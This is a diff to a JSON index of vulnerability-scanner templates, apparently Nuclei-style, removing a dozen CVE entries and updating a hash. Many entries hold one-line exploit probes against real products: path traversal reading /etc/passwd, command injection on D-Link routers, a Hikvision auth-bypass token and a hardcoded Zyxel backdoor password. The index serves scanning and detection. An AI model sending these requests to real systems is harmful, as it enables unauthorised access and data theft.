@@ -1,6 +1,6 @@
 {
   "version": "2026.11.4",
-  "sha256": "d59eabe05081435283efec6b95a10a55a14de319193344400154ff9cc8b4741c",
+  "sha256": "78f5472cd232781e383b590e1c4f1b7eac0fd9a2b77dd6b87706cb33da85e94a",
   "templates": [
     {
       "id": "CVE-2001-0537",
@@ -147,22 +147,6 @@
       ],
       "request": "GET {{BaseURL}}/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd",
       "own_ip": true
-    },
-    {
-      "id": "CVE-2012-3153",
-      "cve": "CVE-2012-3153",
-      "path": "http/cves/2012/CVE-2012-3153.yaml",
-      "sha256": "a6865b1bb4d73afb9c2ad7a283ccfce3feab5c3e155cf7d74093ef08fa607b61",
-      "tags": [
-        "cve",
-        "cve2012",
-        "oracle",
-        "rce",
-        "edb",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/reports/rwservlet/showenv"
     },
     {
       "id": "CVE-2013-7091",
@@ -627,22 +611,6 @@
       "own_ip": true
     },
     {
-      "id": "CVE-2017-7921",
-      "cve": "CVE-2017-7921",
-      "path": "http/cves/2017/CVE-2017-7921.yaml",
-      "sha256": "8406609a17a03f028753468929ce25c51319ba0078acba3622f9b4209fb77de4",
-      "tags": [
-        "cve",
-        "cve2017",
-        "auth-bypass",
-        "hikvision",
-        "vkev",
-        "vuln",
-        "kev"
-      ],
-      "request": "GET {{BaseURL}}/system/deviceInfo?auth=YWRtaW46MTEK"
-    },
-    {
       "id": "CVE-2017-8225",
       "cve": "CVE-2017-8225",
       "path": "http/cves/2017/CVE-2017-8225.yaml",
@@ -656,23 +624,6 @@
         "vkev"
       ],
       "request": "GET {{BaseURL}}/system.ini?loginuse\u0026loginpas"
-    },
-    {
-      "id": "CVE-2017-9833",
-      "cve": "CVE-2017-9833",
-      "path": "http/cves/2017/CVE-2017-9833.yaml",
-      "sha256": "507a9a5c6c6294aa95919a01cf8c0c877af487af12448cffc22195a0ed443a59",
-      "tags": [
-        "cve",
-        "cve2017",
-        "boa",
-        "lfr",
-        "lfi",
-        "edb",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/cgi-bin/wapopen?B1=OK\u0026NO=CAM_16\u0026REFRESH_TIME=Auto_00\u0026FILECAMERA=../../etc/passwd%00\u0026REFRESH_HTML=auto.htm\u0026ONLOAD_HTML=onload.htm\u0026STREAMING_HTML=streaming.htm\u0026NAME=admin\u0026PWD=admin\u0026PIC_S"
     },
     {
       "id": "CVE-2018-0127",
@@ -726,25 +677,6 @@
         "vuln"
       ],
       "request": "GET {{BaseURL}}"
-    },
-    {
-      "id": "CVE-2018-10823",
-      "cve": "CVE-2018-10823",
-      "path": "http/cves/2018/CVE-2018-10823.yaml",
-      "sha256": "2b4c6d0cae872addf55297574661208936744e145ff60ea863a454a420f51e1d",
-      "tags": [
-        "cve",
-        "cve2018",
-        "rce",
-        "iot",
-        "dlink",
-        "router",
-        "edb",
-        "seclists",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd"
     },
     {
       "id": "CVE-2018-11138",
@@ -1372,24 +1304,6 @@
       "request": "POST /password_change.cgi HTTP/1.1"
     },
     {
-      "id": "CVE-2019-16057",
-      "cve": "CVE-2019-16057",
-      "path": "http/cves/2019/CVE-2019-16057.yaml",
-      "sha256": "13674d32d9abe1af9fda86e1147df457256acf5d7174c4935b772cc2b66b8af3",
-      "tags": [
-        "cve",
-        "cve2019",
-        "lfi",
-        "rce",
-        "kev",
-        "sharecenter",
-        "dlink",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/cgi-bin/login_mgr.cgi?C1=ON\u0026cmd=login\u0026f_type=1\u0026f_username=admin\u0026port=80%7Cpwd%26id\u0026pre_pwd=1\u0026pwd=%20\u0026ssl=1\u0026ssl_port=1\u0026username="
-    },
-    {
       "id": "CVE-2019-1653",
       "cve": "CVE-2019-1653",
       "path": "http/cves/2019/CVE-2019-1653.yaml",
@@ -2000,21 +1914,6 @@
       "own_ip": true
     },
     {
-      "id": "CVE-2020-27866",
-      "cve": "CVE-2020-27866",
-      "path": "http/cves/2020/CVE-2020-27866.yaml",
-      "sha256": "a69b36bc13d303cf7a56af2c3e2a798418fd406ef8303bb157303bcf67506f6f",
-      "tags": [
-        "cve",
-        "cve2020",
-        "netgear",
-        "auth-bypass",
-        "vuln",
-        "vkev"
-      ],
-      "request": "GET /setup.cgi?todo=debug\u0026x=currentsetting.htm HTTP/1.1"
-    },
-    {
       "id": "CVE-2020-27986",
       "cve": "CVE-2020-27986",
       "path": "http/cves/2020/CVE-2020-27986.yaml",
@@ -2043,23 +1942,6 @@
         "vuln"
       ],
       "request": "GET {{BaseURL}}/index.php?page=/etc/passwd%00"
-    },
-    {
-      "id": "CVE-2020-29583",
-      "cve": "CVE-2020-29583",
-      "path": "http/cves/2020/CVE-2020-29583.yaml",
-      "sha256": "a2798bdd76f318d4bd801a8958c674209fd39845d73c29fa63a5b1e2fc43cbdc",
-      "tags": [
-        "cve",
-        "cve2020",
-        "ftp-backdoor",
-        "zyxel",
-        "bypass",
-        "kev",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET /?username=zyfwp\u0026password=PrOw!aN_fXp HTTP/1.1"
     },
     {
       "id": "CVE-2020-3187",
@@ -3259,26 +3141,6 @@
       "request": "GET {{BaseURL}}/module/api.php?mobile/webNasIPS"
     },
     {
-      "id": "CVE-2022-2551",
-      "cve": "CVE-2022-2551",
-      "path": "http/cves/2022/CVE-2022-2551.yaml",
-      "sha256": "772cec66918974ad12a9f86acbf26f89b858832449c216b916a41668f8368bb5",
-      "tags": [
-        "cve2022",
-        "cve",
-        "wordpress",
-        "wp",
-        "wp-plugin",
-        "duplicator",
-        "wpscan",
-        "snapcreek",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET {{BaseURL}}/wp-content/backups-dup-lite/dup-installer/main.installer.php?is_daws=1",
-      "own_ip": true
-    },
-    {
       "id": "CVE-2022-26143",
       "cve": "CVE-2022-26143",
       "path": "http/cves/2022/CVE-2022-26143.yaml",
@@ -3795,25 +3657,6 @@
         "vuln"
       ],
       "request": "GET /hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber\u0026_cfclient=true HTTP/1.1"
-    },
-    {
-      "id": "CVE-2023-2732",
-      "cve": "CVE-2023-2732",
-      "path": "http/cves/2023/CVE-2023-2732.yaml",
-      "sha256": "63476572f8c1cbc7d9d718ed571dd4830df7245483cd7574c1a6bfbac5ca0f0f",
-      "tags": [
-        "cve2023",
-        "cve",
-        "wordpress",
-        "wp",
-        "wp-plugin",
-        "auth-bypass",
-        "mstore-api",
-        "inspireui",
-        "vkev",
-        "vuln"
-      ],
-      "request": "GET /wp-json/wp/v2/add-listing?id=1 HTTP/1.1"
     },
     {
       "id": "CVE-2023-27482",
@@ -5142,23 +4985,6 @@
       "request": "GET /management/admindatabase.aspx HTTP/1.1"
     },
     {
-      "id": "CVE-2025-13390",
-      "cve": "CVE-2025-13390",
-      "path": "http/cves/2025/CVE-2025-13390.yaml",
-      "sha256": "3de433e4dbfce0ca11711463ed05f7c7f4397ff716e2fa2913df631918743635",
-      "tags": [
-        "cve",
-        "cve2025",
-        "wordpress",
-        "wp",
-        "wp-plugin",
-        "auth-bypass",
-        "wpdirectorykit",
-        "vkev"
-      ],
-      "request": "GET /?auto-login=1\u0026user_id=1\u0026token=c4ca4238a0 HTTP/1.1"
-    },
-    {
       "id": "CVE-2025-13773",
       "cve": "CVE-2025-13773",
       "path": "http/cves/2025/CVE-2025-13773.yaml",
@@ -5808,21 +5634,6 @@
       ],
       "request": "GET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml HTTP/1.1",
       "own_ip": true
-    },
-    {
-      "id": "CVE-2026-27944",
-      "cve": "CVE-2026-27944",
-      "path": "http/cves/2026/CVE-2026-27944.yaml",
-      "sha256": "e5cc94d49c7430d5a7ac52f12e7a9f64a8aca2994de606240817468d6ca77c05",
-      "tags": [
-        "cve",
-        "cve2026",
-        "nginx-ui",
-        "unauth",
-        "exposure",
-        "vkev"
-      ],
-      "request": "GET {{BaseURL}}/api/backup"
     },
     {
       "id": "CVE-2026-29059",
